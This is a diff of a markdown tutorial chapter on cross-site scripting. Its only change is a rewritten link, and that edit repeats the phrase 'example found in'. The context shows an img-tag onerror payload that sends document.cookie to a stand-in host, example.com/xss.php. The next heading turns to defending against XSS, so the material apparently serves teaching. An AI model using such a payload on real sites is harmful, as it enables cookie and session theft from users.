@@ -41,7 +41,7 @@ This code shows how a missing image can be used with an HTML attribute to trigge
 <img src="http://nofile" onerror="adr='http://example.com/xss.php?'+ encodeURIComponent(document.cookie)">
 ```
 
-Example fount in example found in **[Externals/xss.html](../Externals/xss.html)**
+Example fount in example found in example found in <a target="_blank" href="Chapter_05/Externals/xss.html">**Chapter_05/Externals/xss.html**</a>
 
 ## Defending aginst Cross-Site Scripting attack
 
